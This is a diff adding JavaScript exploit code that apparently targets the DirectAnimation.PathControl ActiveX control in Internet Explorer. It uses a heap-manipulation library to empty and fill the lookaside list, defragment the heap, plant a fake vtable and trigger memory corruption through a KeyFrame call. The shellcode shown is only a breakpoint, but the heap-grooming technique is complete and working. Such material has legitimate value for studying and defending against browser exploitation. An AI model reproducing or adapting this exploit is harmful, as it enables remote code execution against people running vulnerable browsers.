@@ -1,0 +1,51 @@
+﻿ // Create the ActiveX object
+    var target = new ActiveXObject("DirectAnimation.PathControl");
+
+    // Initialize the heap library
+    var heap = new heapLib.ie();
+
+    // int3 shellcode
+    var shellcode = unescape("%uCCCC");
+
+    // address of jmp ecx instruction in IEXPLORE.EXE
+    var jmpecx = 0x4058b5;
+
+    // Build a fake vtable with pointers to the shellcode
+    var vtable = heap.vtable(shellcode, jmpecx);
+
+    // Get the address of the lookaside that will point to the vtable
+    var fakeObjPtr = heap.lookasideAddr(vtable);
+
+    // Build the heap block with the fake object address
+    //
+    // len      padding         fake obj pointer  padding   null
+    // 4 bytes  0x200C-4 bytes  4 bytes           14 bytes  2 bytes
+
+    var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) + heap.padding(14/2);
+
+    heap.gc();
+    heap.debugHeap(true);
+
+    // Empty the lookaside
+    heap.debug("Emptying the lookaside")
+    for (var i = 0; i < 100; i++)
+        heap.alloc(vtable)
+
+    // Put the vtable on the lookaise
+    heap.debug("Putting the vtable on the lookaside")
+    heap.lookaside(vtable);
+
+    // Defragment the heap
+    heap.debug("Defragmenting the heap with blocks of size 0x2010")
+    for (var i = 0; i < 100; i++)
+        heap.alloc(0x2010)
+
+    // Add the block with the fake object pointer to the free list
+    heap.debug("Creating two holes of size 0x2020");
+    heap.freeList(fakeObjChunk, 2);
+
+    // Trigger the exploit
+    target.KeyFrame(0x40000801, new Array(1), new Array(1));
+
+    // Cleanup
+    heap.debugHeap(false);
